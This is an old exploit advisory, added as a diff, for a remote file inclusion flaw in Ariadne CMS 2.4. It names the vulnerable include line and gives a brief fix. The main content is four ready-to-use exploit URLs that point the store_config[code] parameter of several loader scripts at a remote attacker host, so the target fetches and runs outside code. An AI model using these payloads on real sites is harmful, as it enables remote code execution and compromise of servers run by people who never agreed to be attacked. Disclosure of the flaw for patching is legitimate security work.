@@ -1,0 +1,49 @@
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Ariadne v2.4 (store_config[code]) Remote File Include Vuln
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Found: Cyber-Security.Org
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Version: 2.4
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Code: include_once($store_config['code']."modules/mod_debug.php");
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+F.X:
+
+1- open files
+
+2- add this code before wrong codes
+
+require("../www/ariadne.inc");
+
+3- save files
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Exploit:
+
+www.target.com/script_path/lib/includes/loader.cmd.php?store_config[code]=http://evilscripts ?
+www.target.com/script_path/lib/includes/loader.ftp.php?store_config[code]=http://evilscripts ?
+www.target.com/script_path/lib/includes/loader.soap.php?store_config[code]=http://evilscripts ?
+www.target.com/script_path/lib/includes/loader.web.php?store_config[code]=http://evilscripts ?
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Thanx: DJR, xoron, K@OS, trampfd, Konaksinamon, KripteX, sakkure, Seyfullah, MaSSiMo, Kano, whiteguide
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Script Download: http://www.ariadne-cms.org/download/ariadne/ariadne.2.4.zip
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+# milw0rm.com [2006-11-04]
